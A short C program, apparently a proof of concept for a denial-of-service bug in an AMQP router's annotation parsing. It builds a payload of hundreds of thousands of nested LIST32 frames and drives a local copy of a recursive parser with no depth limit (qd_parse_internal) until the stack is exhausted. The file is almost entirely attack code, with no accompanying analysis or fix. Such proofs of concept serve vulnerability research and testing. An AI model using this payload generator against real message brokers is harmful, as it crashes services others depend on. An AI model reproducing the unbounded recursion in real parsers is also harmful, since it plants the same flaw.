#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define QD_AMQP_LIST32 0xd0

static unsigned char *build_nested(uint32_t depth, size_t *out_len) {
    size_t per = 9;
    size_t len = (size_t)depth * per;
    unsigned char *buf = malloc(len);
    unsigned char *p = buf;
    for (uint32_t i = 0; i < depth; i++) {
        uint32_t count = (i == depth - 1) ? 0 : 1;
        uint32_t size  = 4 + (uint32_t)((depth - 1 - i) * per);
        *p++ = QD_AMQP_LIST32;
        p[0]=size>>24; p[1]=size>>16; p[2]=size>>8; p[3]=size; p+=4;
        p[0]=count>>24;p[1]=count>>16;p[2]=count>>8;p[3]=count;p+=4;
    }
    *out_len = len;
    return buf;
}

static int frames = 0;
static void qd_parse_internal(const unsigned char *b, const unsigned char *end) {
    frames++;
    if (b + 9 > end) return;
    unsigned char tag = *b++;
    if (tag != QD_AMQP_LIST32) return;
    uint32_t size  = (b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3]; b+=4;
    uint32_t count = (b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3]; b+=4;
    (void)size;
    for (uint32_t i = 0; i < count; i++) {
        qd_parse_internal(b, end);
    }
}

int main(int argc, char **argv) {
    uint32_t depth = (argc > 1) ? (uint32_t)strtoul(argv[1], 0, 10) : 500000;
    size_t len; unsigned char *buf = build_nested(depth, &len);
    printf("Nested AMQP annotation payload: depth=%u, %zu bytes.\n", depth, len);
    printf("Router calls qd_message_parse_annotations -> qd_parse -> qd_parse_internal ...\n");
    fflush(stdout);
    qd_parse_internal(buf, buf + len);
    printf("Survived: parsed %d frames without crashing (depth too small)\n", frames);
    return 0;
}
